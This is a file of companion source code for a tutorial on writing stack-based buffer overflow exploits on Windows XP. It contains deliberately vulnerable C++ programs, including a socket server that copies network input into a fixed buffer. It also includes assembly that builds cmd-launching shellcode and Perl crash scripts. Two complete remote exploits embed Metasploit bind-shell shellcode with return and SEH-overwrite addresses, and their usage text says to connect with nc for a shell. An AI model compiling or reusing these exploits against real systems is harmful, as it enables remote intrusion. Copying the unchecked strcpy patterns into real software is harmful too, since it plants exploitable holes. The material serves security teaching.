@@ -1,0 +1,835 @@
+Below is the source code that is used in "Writing Stack Based Overflows on Windows".
+
+helloworld.cpp
+==============
+
+#include "stdafx.h"
+int main(int argc, char* argv[])
+{
+	printf("Hello World!\n");
+	return 0;
+}
+
+basicvuln.cpp
+=============
+// The example has been tested in Visual Studio 6.0 on 
+// Windows XP (no Service Pack, it should work on 
+// windows XP sp2 as well).
+
+#include "stdafx.h"
+#include <string.h>
+void main()
+{
+	char var[10];
+	strcpy( var, "AAAABBBBCCCCDDDDEEEEFFFFGGGGHHHH\n" );
+	printf( var );
+}
+
+basichacked.cpp
+===============
+// Perl will be used to build the command line argument.
+//basichacked.cpp
+
+#include "stdafx.h"
+#include "string.h"
+#include "stdlib.h"
+
+//Function copy performs a copy into variable var and exits.
+int copy(char* input)
+{
+	char var[20];
+	strcpy (var, input);
+	return 0;
+}
+
+// Function hacked prints out a string to the console, is not called
+// anywhere and note it exits using exit function, which exits the
+// whole program, not just the function hacked.
+
+int hacked(void)
+{
+	printf("Can you see me now ?\n");
+	exit(0);
+}
+
+int main(int argc, char* argv[])
+{	
+// commandline arguments are provided to the executable
+if(argc < 2)
+	{
+		printf("Usage: %s <string>\r\n", argv[0]);
+		printf("written by Nish[a-t]securitycompass.com");
+		exit(1);
+	}	
+	//prints the address of function hacked onto the console.
+	printf("Address of function: 0x%08x\n", hacked); 	
+	//passes argument 1 to the function copy.
+	copy(argv[1]);
+	return 0;
+}
+
+basicxploit.pl
+==============
+$arg = "AAAAABBBBBCCCCCDDDDDEEEE"."\x0f\x10\x40";
+$cmd = "./basichacked.exe ".$arg;
+system($cmd);
+
+
+sleep.cpp
+==========
+// sleep.cpp : Defines the entry point for the console application.
+#include "stdafx.h"
+#include "Windows.h"
+//this has been written in visual studio .NET, this can be written in VS 6 as well.
+void main()
+{
+	Sleep(99999999);
+}
+
+
+sleepasm.cpp
+=============
+// sleepasm.cpp : Defines the entry point for the console application.
+//
+
+#include "stdafx.h"
+#include "Windows.h"
+
+void main()
+{
+	__asm
+	{	
+		push 99999999
+		mov eax, 0x77E61BE6
+		call eax
+	}	
+}
+
+cmnd.cpp
+========
+// cmnd.cpp : Defines the entry point for the console application.
+// Executes cmd and opens a command prompt.
+
+#include "stdafx.h"
+#include "Windows.h"
+#include "stdlib.h"
+
+void main()
+{
+	char var[4];
+	var[0]='c';
+	var[1]='m';
+	var[2]='d';
+	var[3]='\0'; //will cause problems as we can't use 00 to execute.
+	WinExec(var,1);
+	exit(1);
+}
+
+
+
+cmdasmdrty.cpp
+=========
+// cmndasmdrty.cpp : Defines the entry point for the console application.                                                                 
+//                                                                                                                                    
+                                                                                                                                      
+#include "stdafx.h"                                                                                                                           
+
+void main()                                                                                                                                   
+{                                                                                                                                             
+	__asm                                                                                                                                 
+	{                                                                                                                                     
+	mov         byte ptr [ebp-4],63h //var[0]='c'                                                                                 
+	mov         byte ptr [ebp-3],6Dh //var[1]='m'                                                                                 
+	mov         byte ptr [ebp-2],64h //var[2]='d'                                                                                 
+	mov         byte ptr [ebp-1],0   //var[3]='\0' 
+	//will cause problems as we can't use 00, it will terminate the //
+	//entire shellcode.
+	//code for WinExec(var, 1);                                                                                                   
+	//mov         esi,esp, we do not really need this instruction 
+	//to execute.                                                    
+	push        1		//argument that is being passed to winexec                                                            
+	lea         eax,[ebp-4]                                                                                                       
+	push        eax	//puting the value onto the stack                                                                             
+	mov eax, 0x77e684C6	//call        dword ptr [__imp__WinExec@8 (0042413c)]                                                 
+	call eax                                                                                                                      
+	//cmp         esi,esp we do not really need this instruction to execute.                                                      
+	//call        __chkesp (00401250) we do not really need this instruction to execute.                                          
+	//code for exit(1);                                                                                                           
+	push        1                                                                                                                 
+	mov eax, 0x77E75CB5                                                                                                           
+	call eax                                                                                                                      
+}                                                                                                                                     
+}                                                                                                                                             
+
+
+
+cmndasm.cpp 
+===========
+
+// cmndasm.cpp : Defines the entry point for the console application.
+
+#include "stdafx.h"
+void main()
+{
+	__asm
+	{
+		mov esp, ebp
+		xor esi,esi
+		push esi
+		
+		mov         byte ptr [ebp-4],63h 
+		mov         byte ptr [ebp-3],6Dh 
+		mov         byte ptr [ebp-2],64h 
+		//mov         byte ptr [ebp-1],0   
+		
+		push 1	
+		lea         eax,[ebp-4]  
+		push        eax	
+		
+		mov eax, 0x77e684C6
+		call eax
+		
+		push 1   
+		
+		mov eax, 0x77E75CB5              
+		call eax                                                                                                                
+	}
+}
+
+
+
+cmndasmxor.cpp
+==============
+// cmndasmxor.cpp : Defines the entry point for the console application.
+#include "stdafx.h"
+
+void main()
+	{
+	__asm
+	{
+		mov esp, ebp
+		xor esi,esi
+		push esi
+		//original cmd\0		
+		//		mov         byte ptr [ebp-4],63h 
+		//		mov         byte ptr [ebp-3],6Dh 
+		//		mov         byte ptr [ebp-2],64h 
+		//		mov         byte ptr [ebp-1],0   
+		
+		mov ecx, 0x777777ff
+		mov ebx, 0x77131A9C
+		xor ecx, ebx
+		//resulting XOR value (0x00646d63) is stored in ecx.
+		mov  [ebp - 4], ecx
+		//the resulting value cmd\0 will be pushed onto the stack.
+		push 1	
+		lea         eax,[ebp-4]  
+		push        eax	
+		mov eax, 0x77e684C6
+		call eax
+		push 1   //push 1 to exit
+		mov eax, 0x77E75CB5              
+		call eax                                                                                                                
+	}
+}
+
+
+server.cpp 
+==========
+
+/* server.cpp : Defines the entry point for the console application.
+Written in VC 6.0*/
+
+#include "stdafx.h"
+#include <iostream>
+#include <winsock.h>
+#include <windows.h>
+
+//load windows socket 
+#pragma comment(lib, "wsock32.lib")
+
+//Define Return Messages
+#define SS_ERROR 1
+#define SS_OK 0
+
+
+void pr( char *str)
+{	
+	char buf[2000]="";	
+	strcpy(buf,str);
+}
+void sError(char *str)
+{
+	MessageBox (NULL, str, "socket Error" ,MB_OK);
+	WSACleanup();
+}
+
+
+int main(int argc, char **argv)
+{
+
+if ( argc != 2)
+{
+	printf("\nUsage: %s <Port Number to listen on.>\n", argv[0]);
+	return SS_ERROR;
+}
+
+WORD sockVersion;
+WSADATA wsaData;
+
+int rVal;
+char Message[5000]="";
+char buf[2000]="";	
+
+u_short LocalPort;
+LocalPort = atoi(argv[1]);
+
+//wsock32 initialized for usage
+sockVersion = MAKEWORD(1,1);
+WSAStartup(sockVersion, &wsaData);
+
+//create server socket
+SOCKET serverSocket = socket(AF_INET, SOCK_STREAM, 0);
+
+if(serverSocket == INVALID_SOCKET)
+{
+	sError("Failed socket()");
+	return SS_ERROR;
+}
+
+SOCKADDR_IN sin;
+sin.sin_family = PF_INET;
+sin.sin_port = htons(LocalPort);
+sin.sin_addr.s_addr = INADDR_ANY;
+
+//bind the socket
+rVal = bind(serverSocket, (LPSOCKADDR)&sin, sizeof(sin));
+if(rVal == SOCKET_ERROR)
+{
+	sError("Failed bind()");
+	WSACleanup();
+	return SS_ERROR;
+}
+
+//get socket to listen 
+rVal = listen(serverSocket, 10);
+if(rVal == SOCKET_ERROR)
+{
+	sError("Failed listen()");
+	WSACleanup();
+	return SS_ERROR;
+}
+
+//wait for a client to connect
+SOCKET clientSocket;
+clientSocket = accept(serverSocket, NULL, NULL);
+if(clientSocket == INVALID_SOCKET)
+{
+	sError("Failed accept()");
+	WSACleanup();
+	return SS_ERROR;
+} 
+
+int bytesRecv = SOCKET_ERROR;
+while( bytesRecv == SOCKET_ERROR ) 
+{
+	//receive the data that is being sent by the client max limit to 5000 bytes.
+	bytesRecv = recv( clientSocket, Message, 5000, 0 );
+	
+	if ( bytesRecv == 0 || bytesRecv == WSAECONNRESET ) 
+	{
+		printf( "\nConnection Closed.\n");
+		break;
+	}
+}
+
+//Pass the data received to the function pr
+pr(Message);
+
+//close client socket
+closesocket(clientSocket);
+//close server socket
+closesocket(serverSocket);
+
+WSACleanup();
+
+return SS_OK;
+}
+
+
+client.cpp
+===========
+/* client.cpp : Defines the entry point for the console application.
+Written in VC 6.0*/
+create a TCP socket (client socket)
+create a hostent structure 
+resolve ip address
+if successful
+then
+create another socket with socket_in (essentially server socket)
+copy the contents of the hostent into new socket
+
+*/
+
+#include "stdafx.h"
+#include <iostream>
+#include <winsock.h>
+
+//load windows socket 
+#pragma comment(lib, "wsock32.lib")
+
+//Define Return Messages
+#define CS_ERROR 1
+#define CS_OK 0
+
+
+//Usage Function
+void usage(char *name)
+{
+	printf("usage: %s <Server Host> <Server Port> <Message To Be Sent>\n\n", name);
+}
+
+//Error Function
+void sError(char *str)
+{
+	MessageBox(NULL, str, "Client Error" ,MB_OK);
+	WSACleanup();
+}
+
+
+int main(int argc, char **argv)
+{
+	//Declarations
+	
+	char* serverIP;
+	unsigned short serverPort;
+	
+	
+	WORD version ;
+	version = MAKEWORD(1,1);
+	WSADATA wsaData;
+	
+	
+	if(argc != 4)
+	{
+		usage(argv[0]);
+		return  CS_ERROR;
+	}
+	
+	//wsock32 initialized/started up for usage
+	WSAStartup(version,&wsaData);
+	
+	//Create Socket
+	SOCKET clientSocket;
+	clientSocket = socket(AF_INET, SOCK_STREAM, 0);
+	
+	if(clientSocket == INVALID_SOCKET)
+	{	
+		sError("Socket error!");
+		closesocket(clientSocket);
+		WSACleanup();				
+		return CS_ERROR;
+	}
+	
+	
+	struct hostent	*srv_ptr;
+	
+	//gethostbyname returns a pointer to hostent( a structure which store information about a host)
+	
+	srv_ptr = gethostbyname(argv[1]);
+	
+	if( srv_ptr == NULL )
+	{
+		sError("Can't resolve name.");
+		WSACleanup();
+		return CS_ERROR;
+	}
+	struct sockaddr_in serverSocket;
+	serverIP = inet_ntoa (*(struct in_addr *)*srv_ptr->h_addr_list);
+	serverPort = htons(u_short(atoi(argv[2])));
+	
+	serverSocket.sin_family = AF_INET;
+	serverSocket.sin_addr.s_addr = inet_addr(serverIP);
+	serverSocket.sin_port = serverPort;
+	
+	//Attempt to connect to remote host
+	if (connect(clientSocket, (struct sockaddr *)&serverSocket, sizeof(serverSocket)))
+	{
+		sError("Connection error.");
+		return CS_ERROR;
+	}
+	// Send data on successful connection, note no limit on argv[3]
+	send(clientSocket, argv[3], strlen(argv[3]), 0);
+	
+	printf("\nMessage Sent\nConnection Closed.\n"); 
+	closesocket(clientSocket);
+	WSACleanup();
+	return CS_OK;
+}
+
+crashserver.pl
+==============
+
+#perl program to crash the server.
+$arg= "A"x 2000 ."BBBBCCCCDDDDEEEEFFFFGGGGHHHHIIIIJJJJ";
+# EIP = CCCC and EBP = BBBB
+# note ip address.
+$cmd = "client.exe 127.0.0.1 9999 ".$arg;
+system($cmd);
+
+
+Xploit.cpp
+==========
+/*Xploit.cpp : Defines the entry point for the console application.
+port listner starts on port 9191
+Shell code has been generated from metasploit.com website.
+
+create a TCP socket (client socket)
+create a hostent structure 
+resolve ip address
+if successful
+then
+create another socket with socket_in (essentially server socket)
+copy the contents of the hostent into new socket
+*/
+
+#include "stdafx.h"
+#pragma comment(lib, "wsock32.lib")
+#include <iostream>
+#include <windows.h>
+#include <winsock.h>
+
+#define NOP 0x90
+#define BUFSIZE 3500
+
+#define CS_ERROR 1
+#define CS_OK 0
+
+void usage(char *name)
+{     
+	printf("written by Nish Bhalla <Nish[a-t]securitycompass.com>  \nusage: %s <Server Host> <Server Port>\nAfter running the exploit nc -vv <Remote IP> 9191\n", name);
+}
+void sError(char *str)
+{
+	MessageBox (NULL, str, "socket Error" ,MB_OK);
+	WSACleanup();
+}
+int main(int argc, char **argv)
+{
+	/* win32_bind - Encoded Shellcode [\x00]
+	[ EXITFUNC=process LPORT=9191 Size=399 ] 
+	http://metasploit.com 
+	shellcode generated from metasploit.com, it encodes \x00*/
+	unsigned char reverseshell[] = 
+	"\xd9\xee\xd9\x74\x24\xf4\x5b\x31\xc9\xb1\x5e\x81\x73\x17\x12\x56"
+	"\xf1\x86\x83\xeb\xfc\xe2\xf4\xee\xbe\xa7\x86\x12\x56\xa2\xd3\x44"
+	"\x01\x7a\xea\x36\x4e\x7a\xc3\x2e\xdd\xa5\x83\x6a\x57\x1b\x0d\x58"
+	"\x4e\x7a\xdc\x32\x57\x1a\x65\x20\x1f\x7a\xb2\x99\x57\x1f\xb7\xed"
+	"\xaa\xc0\x46\xbe\x6e\x11\xf2\x15\x97\x3e\x8b\x13\x91\x1a\x74\x29"
+	"\x2a\xd5\x92\x67\xb7\x7a\xdc\x36\x57\x1a\xe0\x99\x5a\xba\x0d\x48"
+	"\x4a\xf0\x6d\x99\x52\x7a\x87\xfa\xbd\xf3\xb7\xd2\x09\xaf\xdb\x49"
+	"\x94\xf9\x86\x4c\x3c\xc1\xdf\x76\xdd\xe8\x0d\x49\x5a\x7a\xdd\x0e"
+	"\xdd\xea\x0d\x49\x5e\xa2\xee\x9c\x18\xff\x6a\xed\x80\x78\x41\x93"
+	"\xba\xf1\x87\x12\x56\xa6\xd0\x41\xdf\x14\x6e\x35\x56\xf1\x86\x82"
+	"\x57\xf1\x86\xa4\x4f\xe9\x61\xb6\x4f\x81\x6f\xf7\x1f\x77\xcf\xb6"
+	"\x4c\x81\x41\xb6\xfb\xdf\x6f\xcb\x5f\x04\x2b\xd9\xbb\x0d\xbd\x45"
+	"\x05\xc3\xd9\x21\x64\xf1\xdd\x9f\x1d\xd1\xd7\xed\x81\x78\x59\x9b"
+	"\x95\x7c\xf3\x06\x3c\xf6\xdf\x43\x05\x0e\xb2\x9d\xa9\xa4\x82\x4b"
+	"\xdf\xf5\x08\xf0\xa4\xda\xa1\x46\xa9\xc6\x79\x47\x66\xc0\x46\x42"
+	"\x06\xa1\xd6\x52\x06\xb1\xd6\xed\x03\xdd\x0f\xd5\x67\x2a\xd5\x41"
+	"\x3e\xf3\x86\x31\xb1\x78\x66\x78\x46\xa1\xd1\xed\x03\xd5\xd5\x45"
+	"\xa9\xa4\xae\x41\x02\xa6\x79\x47\x76\x78\x41\x7a\x15\xbc\xc2\x12"
+	"\xdf\x12\x01\xe8\x67\x31\x0b\x6e\x72\x5d\xec\x07\x0f\x02\x2d\x95"
+	"\xac\x72\x6a\x46\x90\xb5\xa2\x02\x12\x97\x41\x56\x72\xcd\x87\x13"
+	"\xdf\x8d\xa2\x5a\xdf\x8d\xa2\x5e\xdf\x8d\xa2\x42\xdb\xb5\xa2\x02"
+	"\x02\xa1\xd7\x43\x07\xb0\xd7\x5b\x07\xa0\xd5\x43\xa9\x84\x86\x7a"
+	"\x24\x0f\x35\x04\xa9\xa4\x82\xed\x86\x78\x60\xed\x23\xf1\xee\xbf"
+	"\x8f\xf4\x48\xed\x03\xf5\x0f\xd1\x3c\x0e\x79\x24\xa9\x22\x79\x67"
+	"\x56\x99\xf8\xca\xb4\x82\x79\x47\x52\xc0\x5d\x41\xa9\x21\x86";
+	
+	
+	//Declarations
+	//LPHOSTENT serverSocket;
+	
+	char* serverIP;
+	
+	int tout = 20000;
+	int rcount = 0;
+	
+	unsigned short serverPort;
+	char MessageToBeSent[BUFSIZE] = {""};
+	
+	WORD version ;
+	version = MAKEWORD(1,1);
+	WSADATA wsaData;
+	
+	// jmp ESP for windows xp sp2
+	//char jmpcode[]="\xED\x1E\x94\x7C";
+	
+	// address for jmp EDI for windows xp (NO SP)
+	//77EA855E jmp edi	
+	char jmpcode[]="\x5E\x85\xEA\x77";
+	
+	if(argc != 3)
+	{
+		usage(argv[0]);
+		return  CS_ERROR;
+	}
+	
+	//wsock32 initialized/started up for usage
+	WSAStartup(version,&wsaData);
+	
+	SOCKET clientSocket;
+	clientSocket = socket(AF_INET, SOCK_STREAM, 0);
+	
+	if(clientSocket == INVALID_SOCKET)
+	{	
+		printf("Socket error!\r\n");
+		closesocket(clientSocket);
+		WSACleanup();				
+		return CS_ERROR;
+	}
+	
+	//gethostbyname returns a pointer to hostent( a structure which store information about a host)
+	struct hostent	*srv_ptr;
+	srv_ptr = gethostbyname( argv[1]);
+	
+	if( srv_ptr == NULL )
+	{
+		printf("Can't resolve name, %s.\n", argv[1]);
+		WSACleanup();
+		return CS_ERROR;
+	}
+	
+	struct sockaddr_in serverSocket;
+	
+	serverIP = inet_ntoa (*(struct in_addr *)*srv_ptr->h_addr_list);
+	serverPort = htons(u_short(atoi(argv[2])));
+	
+	serverSocket.sin_family = AF_INET;
+	serverSocket.sin_addr.s_addr = inet_addr(serverIP);
+	serverSocket.sin_port = serverPort;
+	
+	//Attempt to connect to remote host
+	if (connect(clientSocket, (struct sockaddr *)&serverSocket, sizeof(serverSocket)))
+	{
+	    printf("\nConnection error.\n");
+	    return CS_ERROR;
+	}
+	
+	memset( MessageToBeSent, NOP, BUFSIZE);
+	
+	memcpy( MessageToBeSent + 1200, reverseshell, sizeof(reverseshell)-1);
+	memcpy( MessageToBeSent + 2004, jmpcode, sizeof(jmpcode)-1);
+	
+	
+	
+	// Send data on successful connection, note no limit on argv[3]
+	
+	send(clientSocket, MessageToBeSent, strlen(MessageToBeSent), 0);
+	printf("\nMessage Sent\n"); 
+	char rstring[1024]="";
+	
+	int bytesRecv = SOCKET_ERROR;
+	
+	//Following while loop, ensures all data has been sent successfully
+	
+	while( bytesRecv == SOCKET_ERROR ) 
+	{
+		bytesRecv = recv( clientSocket, rstring, sizeof(rstring), 0 );
+		if ( bytesRecv == 0 || bytesRecv == WSAECONNRESET ) 
+		{
+			printf( "\nConnection Closed.\n");
+			break;
+		} 	
+	}
+	
+	closesocket(clientSocket);
+	WSACleanup();
+	return CS_OK;
+}
+
+
+Errorgen.cpp
+============
+// ErrorGen.cpp : Defines the entry point for the console application.
+#include "stdafx.h"
+
+int main()
+{
+	int a, b;
+	a= 4 % 2;
+	b= 4 / a;
+}
+
+
+SEHeXploit.cpp
+===============
+//Exploit for the same server application but the exploit uses the SEH instead of overwriting return code.
+//SEHeXploit.cpp : Defines the entry point for the console application.
+//port listner starts on port 9191
+//Shell code has been generated from metasploit.com website.
+
+
+#include "stdafx.h"
+#pragma comment(lib, "wsock32.lib")
+#include <iostream>
+#include <windows.h>
+#include <winsock.h>
+
+#define NOP 0x90
+#define CS_ERROR 1
+#define CS_OK 0
+#define BUFSIZE 3500
+
+void usage(char *name)
+{     printf("written by Nish Bhalla <Nish[a-t]securitycompass.com>  \nusage: %s <Server Host> <Server Port>\nAfter running the exploit nc -vv <Remote IP> 9191\n", name);
+}
+
+
+void sError(char *str)
+{
+	MessageBox (NULL, str, "socket Error" ,MB_OK);
+	WSACleanup();
+}
+
+
+int main(int argc, char **argv)
+{
+		
+			
+	/* win32_bind - Encoded Shellcode [\x00] [ EXITFUNC=process LPORT=9191 Size=399 ] http://metasploit.com */
+	unsigned char reverseshell[] = 
+	"\xd9\xee\xd9\x74\x24\xf4\x5b\x31\xc9\xb1\x5e\x81\x73\x17\x12\x56"
+	"\xf1\x86\x83\xeb\xfc\xe2\xf4\xee\xbe\xa7\x86\x12\x56\xa2\xd3\x44"
+	"\x01\x7a\xea\x36\x4e\x7a\xc3\x2e\xdd\xa5\x83\x6a\x57\x1b\x0d\x58"
+	"\x4e\x7a\xdc\x32\x57\x1a\x65\x20\x1f\x7a\xb2\x99\x57\x1f\xb7\xed"
+	"\xaa\xc0\x46\xbe\x6e\x11\xf2\x15\x97\x3e\x8b\x13\x91\x1a\x74\x29"
+	"\x2a\xd5\x92\x67\xb7\x7a\xdc\x36\x57\x1a\xe0\x99\x5a\xba\x0d\x48"
+	"\x4a\xf0\x6d\x99\x52\x7a\x87\xfa\xbd\xf3\xb7\xd2\x09\xaf\xdb\x49"
+	"\x94\xf9\x86\x4c\x3c\xc1\xdf\x76\xdd\xe8\x0d\x49\x5a\x7a\xdd\x0e"
+	"\xdd\xea\x0d\x49\x5e\xa2\xee\x9c\x18\xff\x6a\xed\x80\x78\x41\x93"
+	"\xba\xf1\x87\x12\x56\xa6\xd0\x41\xdf\x14\x6e\x35\x56\xf1\x86\x82"
+	"\x57\xf1\x86\xa4\x4f\xe9\x61\xb6\x4f\x81\x6f\xf7\x1f\x77\xcf\xb6"
+	"\x4c\x81\x41\xb6\xfb\xdf\x6f\xcb\x5f\x04\x2b\xd9\xbb\x0d\xbd\x45"
+	"\x05\xc3\xd9\x21\x64\xf1\xdd\x9f\x1d\xd1\xd7\xed\x81\x78\x59\x9b"
+	"\x95\x7c\xf3\x06\x3c\xf6\xdf\x43\x05\x0e\xb2\x9d\xa9\xa4\x82\x4b"
+	"\xdf\xf5\x08\xf0\xa4\xda\xa1\x46\xa9\xc6\x79\x47\x66\xc0\x46\x42"
+	"\x06\xa1\xd6\x52\x06\xb1\xd6\xed\x03\xdd\x0f\xd5\x67\x2a\xd5\x41"
+	"\x3e\xf3\x86\x31\xb1\x78\x66\x78\x46\xa1\xd1\xed\x03\xd5\xd5\x45"
+	"\xa9\xa4\xae\x41\x02\xa6\x79\x47\x76\x78\x41\x7a\x15\xbc\xc2\x12"
+	"\xdf\x12\x01\xe8\x67\x31\x0b\x6e\x72\x5d\xec\x07\x0f\x02\x2d\x95"
+	"\xac\x72\x6a\x46\x90\xb5\xa2\x02\x12\x97\x41\x56\x72\xcd\x87\x13"
+	"\xdf\x8d\xa2\x5a\xdf\x8d\xa2\x5e\xdf\x8d\xa2\x42\xdb\xb5\xa2\x02"
+	"\x02\xa1\xd7\x43\x07\xb0\xd7\x5b\x07\xa0\xd5\x43\xa9\x84\x86\x7a"
+	"\x24\x0f\x35\x04\xa9\xa4\x82\xed\x86\x78\x60\xed\x23\xf1\xee\xbf"
+	"\x8f\xf4\x48\xed\x03\xf5\x0f\xd1\x3c\x0e\x79\x24\xa9\x22\x79\x67"
+	"\x56\x99\xf8\xca\xb4\x82\x79\x47\x52\xc0\x5d\x41\xa9\x21\x86";
+	
+			
+	//Declarations
+	char* serverIP;
+		
+	int tout = 20000;
+	int rcount = 0;
+		
+	unsigned short serverPort;
+	char MessageToBeSent[BUFSIZE] = {""};
+		
+	WORD version ;
+	version = MAKEWORD(1,1);
+	WSADATA wsaData;
+		
+	char jmpcode[]= "\xe7\xc9\xe7\x77\xFB\x7B\xAB\x71\x89\xE1\xFE\xCD\xFE\xCD\xFE\xCD\xFE\xCD\x89\xCC\xFF\xE4";
+	
+	/*Breaking the JMP CODE array Down
+	\xe7\xc9\xe7\x77 
+	Address for the error handler routine which returns to the line below
+	\xFB\x7B\xAB\x71  JMP ESP
+	Address for JMP ESP which points to the next line
+	\x89\xE1		mov ecx, esp 	
+	ESP is 0012E220
+	\xFE\xCD		DEC CH
+	Decrement 8 bit mapping (8-16) bit, Thus ECX would be 0012E120
+	\xFE\xCD		DEC CH
+	Decrement 8 bit mapping (8-16) bit, Thus ECX would be 0012E020
+	\xFE\xCD		DEC CH
+	Decrement 8 bit mapping (8-16) bit, Thus ECX would be 0012DF20
+	\xFE\xCD		DEC CH
+	Decrement 8 bit mapping (8-16) bit, Thus ECX would be 0012DE20
+	\x89\xCC		mov esp, ecx 
+	Move the address stored in ECX to ESP.
+	\xFF\xE4";	JMP ESP, which now points to 0x0012DE20 
+	0x0012DE20 is just before our shellcode
+	*/
+	//Functions
+	if(argc != 3)
+	{
+		usage(argv[0]);
+		return  CS_ERROR;
+	}
+	WSAStartup(version,&wsaData);
+	SOCKET clientSocket;
+	clientSocket = socket(AF_INET, SOCK_STREAM, 0);
+		
+	if(clientSocket == INVALID_SOCKET)
+		{	
+			printf("Socket error!\r\n");
+			closesocket(clientSocket);
+			WSACleanup();				
+			return CS_ERROR;
+		}
+		
+		// Name resolution and assigning to IP
+	
+	struct hostent	*srv_ptr;
+	srv_ptr = gethostbyname( argv[1]);
+	
+	if( srv_ptr == NULL )
+		{
+			printf("Can't resolve name, %s.\n", argv[1]);
+			WSACleanup();
+			return CS_ERROR;
+		}
+	
+	
+	struct sockaddr_in serverSocket;
+	
+	serverIP = inet_ntoa (*(struct in_addr *)*srv_ptr->h_addr_list);
+	serverPort = htons(u_short(atoi(argv[2])));
+	
+	serverSocket.sin_family = AF_INET;
+	serverSocket.sin_addr.s_addr = inet_addr(serverIP);
+	serverSocket.sin_port = serverPort;
+	
+		
+	if (connect(clientSocket, (struct sockaddr *)&serverSocket, sizeof(serverSocket)))
+	{
+			printf("\nConnection error.\n");
+			return CS_ERROR;
+	}
+	
+	memset( MessageToBeSent, NOP, BUFSIZE);
+	
+	memcpy( MessageToBeSent + 1200, reverseshell, sizeof(reverseshell)-1);
+	memcpy( MessageToBeSent + 2000, jmpcode, sizeof(jmpcode)-1);
+	// Sending
+		
+	send(clientSocket, MessageToBeSent, strlen(MessageToBeSent), 0);
+	printf("\nMessage Sent\n"); 
+	char rstring[1024]="";
+	
+	int bytesRecv = SOCKET_ERROR;
+	while( bytesRecv == SOCKET_ERROR ) 
+	{
+		bytesRecv = recv( clientSocket, rstring, sizeof(rstring), 0 );
+		if ( bytesRecv == 0 || bytesRecv == WSAECONNRESET ) 
+			{
+				printf( "\nConnection Closed.\n");
+				break;
+			} 	
+	}
+	closesocket(clientSocket);
+	WSACleanup();
+	return CS_OK;
+}
